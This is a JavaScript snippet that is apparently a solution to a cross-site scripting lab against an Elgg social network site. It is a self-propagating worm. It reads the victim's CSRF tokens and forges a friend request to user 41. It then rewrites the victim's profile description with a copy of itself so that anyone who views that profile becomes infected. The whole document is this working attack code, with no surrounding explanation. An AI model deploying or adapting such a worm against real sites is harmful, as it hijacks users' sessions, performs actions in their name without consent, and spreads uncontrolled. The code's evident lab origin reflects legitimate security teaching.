<script id="worm">
var Ajax=null;
var ts="&__elgg_ts=".concat(elgg.security.token.__elgg_ts);
var token="&__elgg_token=".concat(elgg.security.token.__elgg_token);
var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=41".concat(ts).concat(token);
alert(sendurl);
Ajax=new XMLHttpRequest();
Ajax.open("GET",sendurl,true);
Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
Ajax.setRequestHeader("Keep-Alive","300");
Ajax.setRequestHeader("Connection","keep-alive");
Ajax.setRequestHeader("Cookie",document.cookie);
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
Ajax.send();
var Ajax=null;
var ts="&__elgg_ts=".concat(elgg.security.token.__elgg_ts);
var token="__elgg_token=".concat(elgg.security.token.__elgg_token);
Ajax=new XMLHttpRequest();
Ajax.open("POST","http://www.xsslabelgg.com/action/profile/edit",true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Keep-Alive","300");
Ajax.setRequestHeader("Connection","keep-alive");
Ajax.setRequestHeader("Cookie",document.cookie);
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
var selfPropagate="<script id=\"worm\">".concat(document.getElementById("worm").innerHTML).concat("</").concat("script>");
alert(selfPropagate);
if (elgg.session.user.guid != "41") {
  var content=token.concat(ts).concat("&name=").concat(elgg.session.user.username).concat("&description=").concat(escape(selfPropagate)).concat("&guid=").concat(elgg.session.user.guid);
  alert(content);
  Ajax.send(content);
}
</script>
